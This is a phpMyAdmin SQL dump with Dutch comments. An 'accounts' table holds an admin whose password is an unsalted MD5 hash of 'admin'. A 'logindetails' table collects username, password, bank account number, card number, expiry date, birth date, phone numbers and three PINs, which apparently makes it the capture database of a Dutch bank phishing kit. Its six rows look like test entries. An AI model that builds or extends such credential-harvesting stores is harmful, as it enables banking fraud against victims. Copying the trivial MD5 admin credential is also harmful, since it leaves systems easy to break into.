-- phpMyAdmin SQL Dump
-- version 4.9.0.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Gegenereerd op: 02 apr 2020 om 14:44
-- Serverversie: 10.3.16-MariaDB
-- PHP-versie: 7.3.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `oraop`
--

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `accounts`
--

CREATE TABLE `accounts` (
  `id` int(32) NOT NULL,
  `firstname` varchar(32) NOT NULL,
  `login` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `usertype` varchar(32) NOT NULL,
  `Login_time` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Gegevens worden geëxporteerd voor tabel `accounts`
--

INSERT INTO `accounts` (`id`, `firstname`, `login`, `password`, `usertype`, `Login_time`) VALUES
(454, 'admin', 'admin', '21232f297a57a5a743894a0e4a801fc3', 'admin', '0000-00-00');

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `logindetails`
--

CREATE TABLE `logindetails` (
  `id` int(32) NOT NULL,
  `username` varchar(32) NOT NULL,
  `password` varchar(60) DEFAULT NULL,
  `reknr` varchar(22) DEFAULT NULL,
  `pasnr` varchar(11) DEFAULT NULL,
  `vvdate` varchar(12) DEFAULT NULL,
  `date` varchar(10) DEFAULT NULL,
  `mbnr` varchar(12) DEFAULT NULL,
  `telnr` varchar(12) DEFAULT NULL,
  `pin1` int(5) DEFAULT NULL,
  `pin2` int(5) DEFAULT NULL,
  `pin3` int(5) DEFAULT NULL,
  `dag` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Gegevens worden geëxporteerd voor tabel `logindetails`
--

INSERT INTO `logindetails` (`id`, `username`, `password`, `reknr`, `pasnr`, `vvdate`, `date`, `mbnr`, `telnr`, `pin1`, `pin2`, `pin3`, `dag`) VALUES
(38, '45454545', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(39, '2232323', '454522', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(40, 'jasjdsoida', 'jlasjdklsa', 'NL 90 INGB 0015 4587 9', '454A458', '09-08-2020', '18-06-1978', '0678789452', '0626489899', NULL, NULL, NULL, NULL),
(41, 'nndrz', '115546546', '1321315644', '115L454', '08-22', '14-02-1998', '062326145465', '062621416446', NULL, NULL, NULL, NULL),
(42, 'chef', '1222333', '56454654654654', '444L656', '20-02-20', '05-05-1998', '0623554487', '0622336654', NULL, NULL, NULL, NULL),
(43, '1213213', '65654546', '5654646', '121Q334', '06-06-2022', '19-02-2000', '03232656548', '06232315645', NULL, NULL, NULL, NULL);

--
-- Indexen voor geëxporteerde tabellen
--

--
-- Indexen voor tabel `accounts`
--
ALTER TABLE `accounts`
  ADD PRIMARY KEY (`id`);

--
-- Indexen voor tabel `logindetails`
--
ALTER TABLE `logindetails`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT voor geëxporteerde tabellen
--

--
-- AUTO_INCREMENT voor een tabel `accounts`
--
ALTER TABLE `accounts`
  MODIFY `id` int(32) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=667;

--
-- AUTO_INCREMENT voor een tabel `logindetails`
--
ALTER TABLE `logindetails`
  MODIFY `id` int(32) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=44;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
